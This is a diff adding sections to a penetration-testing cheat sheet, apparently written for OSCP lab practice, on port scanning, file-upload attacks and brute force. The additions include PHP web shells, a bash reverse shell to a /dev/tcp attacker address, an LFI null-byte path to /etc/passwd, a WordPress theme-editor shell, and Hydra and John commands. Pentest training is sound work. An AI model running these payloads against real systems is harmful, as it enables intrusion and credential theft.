@@ -2,6 +2,8 @@
 ### Based on [sushant747 List of common ports](https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html). A majority of this guide is modified from sushant747.
 
 ## Summary 
+* [Discovering Open Ports](##Discovering-Open-Ports)
+* [File Upload Capability](##-File-Upload-Capability)
 * [Port 21 - FTP](#Port-21---FTP)
 * [Port 22 - SSH](#Port-22---SSH)
 * [Port 23 - Telnet](#Port-23---Telnet)
@@ -61,13 +63,66 @@ nmap -v -A -p- --reason -T4 -iL IPTextFile.txt -oA nmap
 ```unicorn
 unicornscan IP 
 ```
-TO DO: CHECK FOR UDP 
+Check for UDP 
+```uniudp
+unicornscan -pa -mU 10.11.1.226
+```
 * masscan 
+Checks for TCP and UDP
 ```masscan
 masscan -p1-65535,U:1-65535 10.10.10.63 --rate=1000 -e tun0
 ```
+* Scripts
+Find common vulnerabilities
+```nmapscripts
+nmap -T4 -p445 --script vuln 10.10.10.# -oN outputFile.txt
+```
+
+## File Upload Capability
+
+### Tools
+* davtest
+```davtest
+TODO: USAGE
+```
+
+* cadavaer
+```cadaver
+TODO: USAGE
+```
+
+### LFI
+* End Files with %00 (Null Byte)
+	* E.g. /etc/passwd%00
+
+### RFI
+* PHP Reverse Shell
+	* Linux
+		```lsal
+		<?php echo shell_exec("ls -al");?>
+		```
+
+		```pentestmonkey
+		# If above works, test reverse shell from pentest monkey 
+		<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.65/443 0>&1");?>
+		```
+	* Windows
+		```
+		<?php echo(system($_GET["cmd"])); ?>
+		```
+		Go to http://victimsite.com/test.php?cmd=dir for command execution 
+	* Listen for the shell
+		* Python Web Server
+		```
+		python -m SimpleHTTPServer 80
+		```
+		* Apache Webserver
+		```apache
+		apache2ctl start | stop
+		```
 
 ## Port 21 - FTP
+FIRST STEP: Discover version number from nmap or steps below
 Connect to the ftp-server to enumerate software and version 
 ```ftp
 ftp 192.168.1.101
@@ -171,6 +226,7 @@ Ftp-server but it uses UDP
 	* Use Cewl
 * WordPress
 	* WPScan
+	* Appearance --> Editor --> edit index.php with reverse shell 
 
 ## Port 88 - Kerberos
 Kerberos is a protocol that is used for network authentication. Different versions are used by \*nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.
@@ -555,7 +611,7 @@ class JConfig {
 Login with rdesktop or xfreerdp 
 ```rdp
 rdesktop -u guest -p guest 10.11.1.5 -g 80%
-xfreerdp TODO
+xfreerdp /v:(target) /u:(user) /p:(password)
 ```
 Brute force 
 ```bf
@@ -627,9 +683,36 @@ Tomcat suffers from default passwords. There is even a module in metasploit that
 ## Port 9389
 Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).
 
+## Cracking Passwords
+* Google it
+* Search on hashkiller.co.uk
+* John The Ripper
+```
+john textfile
+```
+
+## Brute-forcing Login
+* Hydra
+```
+hydra -L users.txt -e nsr ftp://IPADDRESS
+```
+	* -e nsr: normal, backward, and blank
+		* e.g. ftp:ftp, ftp:ptf, ftp:""
+Brute force with a list of passwords
+```
+cp /usr/share/john/password.lst password.lst
+hydra -t 1 -L users.txt -P password.lst -vV 10.11.1.# ftp
+```
 
 ## Tips for when you're stuck
 * Revert the box 
 * Take a breath, look at the nmap scan and start over 
 * Fix the exploit
 	* Google the exploit for modified versions 
+* Check searchsploit instead of google
+	* Check duckduckgo instead of google
+* Look for nmap scripts to confirm the vulnerability
+
+## Resources
+* [Sushant747](https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html)
+* [0Day](http://www.0daysecurity.com/penetration-testing/enumeration.html)
